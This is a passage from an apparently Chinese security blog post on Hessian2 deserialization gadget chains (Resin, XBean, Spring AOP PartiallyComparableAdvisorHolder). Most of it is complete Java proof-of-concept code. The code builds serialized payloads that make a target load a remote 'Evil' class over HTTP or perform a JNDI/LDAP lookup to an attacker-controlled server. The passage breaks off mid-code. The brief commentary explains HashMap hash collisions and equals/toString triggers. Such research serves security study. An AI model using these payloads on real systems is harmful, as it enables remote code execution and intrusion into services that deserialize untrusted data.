class="string">&quot;cirno&quot;</span>);</span><br><span class="line">     setFieldValue(qName,<span class="string">&quot;_context&quot;</span>,continuationContext);</span><br></pre></td></tr></table></figure></div>

<p>进行反序列化触发的内容分析如下：</p>
<p><strong>HashMap 的 putval 实现是通过红黑树实现的，具体分析就不做分析了（以我现在的水平也懒得费时分析，过于费时费事），我就用最直观的数据做分析即可。我们利用的最关键的代码是</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br></pre></td></tr></table></figure></div>

<p>Hessian2 进行 HashMap 的填充为如下代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Map)map).put(in.readObject(), in.readObject());</span><br></pre></td></tr></table></figure></div>

<p>触发put为（这个 key 就是 putval 里面的 key）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<p>putval 中 p一开始为 null，于是 newNode 创建新node，记录第一个node数据，该node为我们的包裹QName的键值对。后续第二次putval，读取的是第二个键值对，此时 p.key 为QName，key 为 Xstring，由于之前设置了hash值相等，此时可以通过 p.hash &#x3D;&#x3D; hash 校验，进而进入 (k &#x3D; p.key) &#x3D;&#x3D; key 的判断，此时 k 被赋值为了 QName，不等于key，进而触发 Xstring.equals(QName)。</p>
<p><strong>所以put的顺序需要关注</strong></p>
<h3 id="针对第二个问题"><a href="#针对第二个问题" class="headerlink" title="针对第二个问题"></a>针对第二个问题</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230210175124400.png"
                      alt="image-20230210175124400"
                ></p>
<p>自己懒得调了，有兴趣的可以试试。我是懒狗</p>
<h1 id="XBean-配合-Hessian2（还是需要spring）"><a href="#XBean-配合-Hessian2（还是需要spring）" class="headerlink" title="XBean 配合 Hessian2（还是需要spring）"></a>XBean 配合 Hessian2（还是需要spring）</h1><p>这条链子和Resin链很相似，只不过是在 XBean 中找到了类似功能的实现，依赖随便选择一个就行。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>首先还是用 XString 触发 <code>ContextUtil.ReadOnlyBinding</code> 的 toString 方法（实际继承 <code>javax.naming.Binding</code>），toString 方法调用 getObject 方法获取对象。</p>
<h2 id="分析-Binding-toString远程类加载"><a href="#分析-Binding-toString远程类加载" class="headerlink" title="分析-Binding toString远程类加载"></a>分析-Binding toString远程类加载</h2><p>在反序列化开始时，还是和 Resin 一样，在读取 put 第二个Node 的时候，需要通过 hash 相等的校验才能进行后续的 equals 方法。但是 HotSwappableTargetSource 它的 hashcode 方法进行了重写，处理方式为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> HotSwappableTargetSource.class.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，我们两个 HotSwappableTargetSource 类不需要之前那种设置 hash，直接就会判断为相等。</p>
<p>然后就可以继续触发 Binding 的 toString 方法，最终实现远程类加载</p>
<p>这个不用咋分析了，大致调一下就能看明白。</p>
<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> XBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBean_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">remoteUrl</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">remoteClass</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> createWithoutConstructor(WritableContext.class);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, remoteClass, remoteUrl);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;foo&quot;</span>, ref, ctx);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(binding);</span><br><span class="line">        <span class="comment">// 设置一个人畜无害内容</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="string">&quot;koishi&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource1,hotSwappableTargetSource1);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource2,hotSwappableTargetSource2);</span><br><span class="line">        <span class="comment">// 反射修改回来</span></span><br><span class="line">        setFieldValue(hotSwappableTargetSource2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] serializedData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian 序列化数据为: &quot;</span> + Base64.getEncoder().encodeToString(serializedData));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 反序列化数据</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>这里再对 HotSwappableTargetSource 做一个记录算了</p>
<h2 id="HotSwappableTargetSource-利用思路归纳"><a href="#HotSwappableTargetSource-利用思路归纳" class="headerlink" title="HotSwappableTargetSource 利用思路归纳"></a>HotSwappableTargetSource 利用思路归纳</h2><p>HotSwappableTargetSource 创建两个实例a，b，分别依次放入HashMap中，当HashMap触发putval方法时（原生反序列化、Hessian2都可），都会实现以下内容。</p>
<p><strong>当代码形式如下时</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">      <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(a);</span><br><span class="line">      <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(b);</span><br><span class="line"></span><br><span class="line">HashMap的node1-&gt;hotSwappableTargetSource1</span><br><span class="line">HashMap的node2-&gt;hotSwappableTargetSource2</span><br></pre></td></tr></table></figure></div>

<p>会执行<font color="red"> **b.equals(a) **</font></p>
<p>目前 b 的主流为 <strong>XString</strong></p>
<ul>
<li>XString 触发 equals 会接着触发 a 的 toString方法，目前搭配常见的 a 一般为 Rome 的 toStringBean</li>
</ul>
<p>（唯一缺陷就是需要Spring依赖）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br></pre></td></tr></table></figure></div>





<h1 id="Spring-Context-AOP"><a href="#Spring-Context-AOP" class="headerlink" title="Spring Context &amp; AOP"></a>Spring Context &amp; AOP</h1><h2 id="PartiallyComparableAdvisorHolder"><a href="#PartiallyComparableAdvisorHolder" class="headerlink" title="PartiallyComparableAdvisorHolder"></a>PartiallyComparableAdvisorHolder</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>





<p><strong>payload</strong></p>
<p>懒得分析，以后看spring的反序列化再细究</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Spring_AOP_AND_Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PartiallyComparableAdvisorHolder_POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/lgvcm1&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType-&gt;SimpleJndiBeanFactory.doGetType-&gt;SimpleJndiBeanFactory.doGetSingleton-&gt;SimpleJndiBeanFactory.lookup-&gt;JndiTemplate.lookup</span></span><br><span class="line">        Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder</span></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        Reflections.setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span class="line">        Reflections.setFieldValue(aif, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder</span></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        Reflections.setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder</span></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        Reflections.setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString</span></span><br><span class="line">        Class&lt;?&gt; pcahCl = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> Reflections.createWithoutConstructor(pcahCl);</span><br><span class="line">        Reflections.setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pcah);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;koishi&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(v1,v2);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] serializedData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hessian 序列化数据为: &quot;</span> + Base64.getEncoder().encodeToString(serializedData));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian 反序列化数据</span></span><br><span class="line">        <span class="comment">// 高版本下的jndi注入需求</span></span><br><span class="line">        <span class="comment">// System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 